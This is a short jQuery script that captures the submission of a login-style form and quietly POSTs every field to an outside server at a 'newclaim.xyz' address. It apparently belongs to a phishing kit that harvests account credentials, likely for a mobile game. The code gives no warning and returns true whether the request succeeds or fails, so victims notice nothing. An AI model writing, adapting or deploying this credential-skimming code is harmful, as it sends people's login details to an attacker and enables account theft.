$(".alexformmoba").submit(function() {
	var d = $(".alexformmoba");

	$.ajax({
        url: "https://trueid.newclaim.xyz/moba/login.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});